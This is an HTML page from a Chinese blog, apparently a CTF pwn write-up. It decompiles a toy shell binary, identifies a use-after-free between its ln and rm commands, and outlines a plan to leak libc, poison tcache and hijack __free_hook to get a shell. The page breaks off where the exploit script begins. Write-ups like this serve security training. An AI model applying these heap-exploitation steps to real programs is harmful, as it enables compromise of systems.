@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"a1ph0nse.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="感觉是一个有问题的shell，应该是UAF。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable_start">
+<meta property="og:url" content="https://a1ph0nse.github.io/2023/03/12/pwnhub_sh_v1.1/index.html">
+<meta property="og:site_name" content="a1ph0nse">
+<meta property="og:description" content="感觉是一个有问题的shell，应该是UAF。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-03-12T15:14:01.000Z">
+<meta property="article:modified_time" content="2023-03-13T06:22:44.000Z">
+<meta property="article:author" content="a1ph0nse">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://a1ph0nse.github.io/2023/03/12/pwnhub_sh_v1.1/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwnable_start | a1ph0nse</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">a1ph0nse</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">一个菜狗的挣扎</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://a1ph0nse.github.io/2023/03/12/pwnhub_sh_v1.1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="a1ph0nse">
+      <meta itemprop="description" content="pwn菜狗、cs菜鸡">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="a1ph0nse">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwnable_start
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-12 23:14:01" itemprop="dateCreated datePublished" datetime="2023-03-12T23:14:01+08:00">2023-03-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-03-13 14:22:44" itemprop="dateModified" datetime="2023-03-13T14:22:44+08:00">2023-03-13</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn-wp/" itemprop="url" rel="index"><span itemprop="name">pwn_wp</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>感觉是一个有问题的shell，应该是UAF。</p>
+<span id="more"></span>
+
+<p>64位保护全开，写的是一个shell。</p>
+<p>输入以空格<code>&#39; &#39;</code>分割三个参数，存储在bss段中处理。</p>
+<p>代码有很多干扰</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">func</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> k; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> ii; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> jj; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> kk; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> m; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="type">int</span> n; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="type">int</span> mm; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !parameter1[<span class="number">0</span>] )                         <span class="comment">// 如果参数1为空则进入</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;command is NULL!!!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameter1, <span class="string">&quot;ls&quot;</span>) )              <span class="comment">// 如果参数1是ls</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">79</span>; ++i )                 <span class="comment">// 输入一个列表</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(&amp;file_flag + <span class="number">6</span> * i) == <span class="number">1LL</span> )       <span class="comment">// *(base+6*i)==1则输出</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s &quot;</span>, &amp;file_flag + <span class="number">48</span> * i + <span class="number">8</span>); <span class="comment">// 输入base+48*i+8指向的内容</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);                              <span class="comment">// 输出&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameter1, <span class="string">&quot;cat&quot;</span>) )             <span class="comment">// cat指令</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( parameter2[<span class="number">0</span>] )                        <span class="comment">// 如果第二个参数有内容</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">79</span>; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameter2, &amp;file_flag + <span class="number">48</span> * j + <span class="number">8</span>) )<span class="comment">// base+48*j+8处的内容与参数2相同</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( *(&amp;file_flag + <span class="number">6</span> * j) == <span class="number">1LL</span> )   <span class="comment">// base+6*j指向内容为1，否则说明no file</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(file_data[<span class="number">6</span> * j]);             <span class="comment">// 输出base2+6*i处的qword</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">LABEL_223:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;NO FILE&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_223;</span><br><span class="line">    &#125;                                           <span class="comment">// no file</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_711;</span><br><span class="line">  &#125;                                             <span class="comment">// filename is null</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameter1, <span class="string">&quot;touch&quot;</span>) )           <span class="comment">// touch指令</span></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( parameter2[<span class="number">0</span>] )                        <span class="comment">// 第二个参数有值</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">79</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !*(&amp;file_flag + <span class="number">6</span> * k) )           <span class="comment">// 如果原本为空</span></span><br><span class="line">        &#123;</span><br><span class="line">          *(&amp;file_flag + <span class="number">6</span> * k) = <span class="number">1LL</span>;          <span class="comment">// 使*(base+6*k)=1,表示有文件</span></span><br><span class="line">          file_data[<span class="number">6</span> * k] = <span class="built_in">malloc</span>(<span class="number">0x208</span>uLL);</span><br><span class="line">          read_buf(file_data[<span class="number">6</span> * k], <span class="number">0x208</span>uLL); <span class="comment">// 读入文件内容</span></span><br><span class="line">          <span class="built_in">strcpy</span>(&amp;file_flag + <span class="number">48</span> * k + <span class="number">8</span>, parameter2);<span class="comment">// 将参数2的内容(file name)复制到file_flag+48*k+8</span></span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">LABEL_807:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Maximum number of files. Please delete the file.&quot;</span>);<span class="comment">// 文件最多80个</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_711:</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;file_name is NULL&quot;</span>);                  <span class="comment">// 第二个参数是filename</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameter1, <span class="string">&quot;cp&quot;</span>) )              <span class="comment">// 复制</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !parameter2[<span class="number">0</span>] || !parameter3[<span class="number">0</span>] )     <span class="comment">// filename为空</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_711;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameter2, &amp;file_flag + <span class="number">8</span>) &amp;&amp; file_flag == <span class="number">1LL</span> )<span class="comment">// 第1个file存在且filename与参数2相同</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">79</span>; ++m )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameter3, &amp;file_flag + <span class="number">48</span> * m + <span class="number">8</span>) )<span class="comment">// 存在一个filename与参数3相同</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">strncpy</span>(file_data[<span class="number">6</span> * m], file_data[<span class="number">0</span>], <span class="number">0x208</span>uLL);<span class="comment">// 复制文件内容，第1个到第m个</span></span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( n = <span class="number">0</span>; ; ++n )                      <span class="comment">//没有同名的file,检查有没有空余位置,有则复制到新文件</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n &gt; <span class="number">79</span> )                           <span class="comment">// 文件太多</span></span><br><span class="line">          <span class="keyword">goto</span> LABEL_807;</span><br><span class="line">        <span class="keyword">if</span> ( !*(&amp;file_flag + <span class="number">6</span> * n) )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      *(&amp;file_flag + <span class="number">6</span> * n) = <span class="number">1LL</span>;              <span class="comment">// 写入标志位</span></span><br><span class="line">      file_data[<span class="number">6</span> * n] = <span class="built_in">malloc</span>(<span class="number">0x208</span>uLL);		<span class="comment">// 分配data的空间</span></span><br><span class="line">      <span class="built_in">strcpy</span>(&amp;file_flag + <span class="number">48</span> * n + <span class="number">8</span>, parameter3); <span class="comment">// 复制第三个参数到filename</span></span><br><span class="line">      <span class="built_in">strncpy</span>(file_data[<span class="number">6</span> * n], file_data[<span class="number">0</span>], <span class="number">0x208</span>uLL); <span class="comment">// 复制data</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_840; 							<span class="comment">// 文件不存在</span></span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameter1, <span class="string">&quot;gedit&quot;</span>) )			<span class="comment">// gedit指令</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !parameter2[<span class="number">0</span>] )						<span class="comment">// 文件名为null</span></span><br><span class="line">      <span class="keyword">goto</span> LABEL_711;</span><br><span class="line">    <span class="keyword">for</span> ( ii = <span class="number">0</span>; ; ++ii )						</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ii &gt; <span class="number">79</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_840;							<span class="comment">// 文件不存在</span></span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameter2, &amp;file_flag + <span class="number">48</span> * ii + <span class="number">8</span>) ) <span class="comment">// 比较参数二和文件名</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;file_flag + <span class="number">6</span> * ii) == <span class="number">1LL</span> )				<span class="comment">// 文件已经存在</span></span><br><span class="line">    &#123;</span><br><span class="line">      read_buf(file_data[<span class="number">6</span> * ii], <span class="number">0x200</span>uLL);			<span class="comment">// 写入0x200byte的data</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_840;								<span class="comment">// 文件不存在</span></span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameter1, <span class="string">&quot;rm&quot;</span>) )				<span class="comment">// 删除</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !parameter2[<span class="number">0</span>] )						<span class="comment">// 文件名为null</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_711;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( jj = <span class="number">0</span>; ; ++jj )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( jj &gt; <span class="number">79</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_840;						<span class="comment">// 文件不存在</span></span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameter2, &amp;file_flag + <span class="number">48</span> * jj + <span class="number">8</span>) ) <span class="comment">// 比较参数二和文件名</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;file_flag + <span class="number">6</span> * jj) == <span class="number">1LL</span> ) <span class="comment">// 文件已经存在</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(file_data[<span class="number">6</span> * jj]); 			<span class="comment">// free并赋0</span></span><br><span class="line">      file_data[<span class="number">6</span> * jj] = <span class="number">0LL</span>;</span><br><span class="line">      *(&amp;file_flag + <span class="number">6</span> * jj) = <span class="number">0LL</span>;		<span class="comment">// 清空标志位</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;					  <span class="comment">// 文件名没管，不知道有无影响</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_840;						<span class="comment">// 文件不存在</span></span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(parameter1, <span class="string">&quot;ln&quot;</span>) )							<span class="comment">// ln指令</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !parameter2[<span class="number">0</span>] )									<span class="comment">// 文件名为null</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_711;</span><br><span class="line">  <span class="keyword">if</span> ( !parameter3[<span class="number">0</span>] )									<span class="comment">// 文件名为null</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_711;</span><br><span class="line">  <span class="keyword">for</span> ( kk = <span class="number">0</span>; ; ++kk )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( kk &gt; <span class="number">79</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_840;									<span class="comment">// 文件不存在</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(parameter2, &amp;file_flag + <span class="number">48</span> * kk + <span class="number">8</span>) )	<span class="comment">// 找参数二对应的文件名</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;file_flag + <span class="number">6</span> * kk) != <span class="number">1LL</span> )				<span class="comment">// 标志位为0</span></span><br><span class="line">  &#123;</span><br><span class="line">LABEL_840:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;file:%s is not exist;&quot;</span>, parameter2);	<span class="comment">// 文件不存在</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( mm = <span class="number">0</span>; ; ++mm )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( mm &gt; <span class="number">79</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_807;								<span class="comment">// 文件太多了</span></span><br><span class="line">    <span class="keyword">if</span> ( !*(&amp;file_flag + <span class="number">6</span> * mm) )					<span class="comment">// 找到一个空位</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;file_flag + <span class="number">48</span> * mm + <span class="number">8</span>, parameter3);		<span class="comment">// 复制第三个参数到file name</span></span><br><span class="line">  *(&amp;file_flag + <span class="number">6</span> * mm) = <span class="number">1LL</span>;					<span class="comment">// 标志位设1</span></span><br><span class="line">  file_data[<span class="number">6</span> * mm] = file_data[<span class="number">6</span> * kk];		<span class="comment">// copy data,从p2到p3</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由上可以大概看出这个shell的功能：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ls: 输出所有flag为1的filename</span><br><span class="line">cat p2: 输出p2指定filename的filedata </span><br><span class="line">touch p2: 创建p2指定filename的文件，并输入文件内容(最大0x208byte) </span><br><span class="line">cp p2 p3: 将名为p2的file复制到名为p3的file中，若不存在名为p3的文件则新建，p2必须是第一个文件的文件名 </span><br><span class="line">gedit p2: 修改名为p2的file的内容(最多0x200byte)</span><br><span class="line">rm p2: 删除名为p2的file，对标志位和chunk指针赋0</span><br><span class="line">ln p2 p3: 将名为p2的file的filedata复制到一个新的名为p3的file中 (复制chunk指针)</span><br><span class="line"></span><br><span class="line">filedata_base: 0xa0e8 qword[6*i] 一个0x208byte</span><br><span class="line">fileflag_base: 0xa0c0 </span><br><span class="line">fileflag_base+6*i: flag,==1表示文件存在，==0表示文件不存在</span><br><span class="line">fileflag_base+48*i+8: filaname</span><br></pre></td></tr></table></figure>
+
+<p>可以看到存在UAF：ln可将同一个<code>chunk</code>指针挂载到多个<code>file</code>中，但<code>rm</code>删除是按照<code>filename</code>删除一个<code>file</code>，仍可通过其他<code>file</code>控制该<code>chunk</code>指针。</p>
+<p>如果这样的话首先利用<code>unsorted bin</code>泄露出堆指针和libcbase， 之后利用<code>UAF</code>走<code>tcache poison</code>劫持<code>free_hook</code>来<code>get shell</code>。</p>
+<p>本地还能用下<code>one_gadget</code>，远程估计只能通过<code>malloc_hook</code>用’LibcSearcher’搜<code>libc</code>，之后走<code>system(&quot;&quot;/bin/sh\x00&quot;)</code>。</p>
+<p>本地exp:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 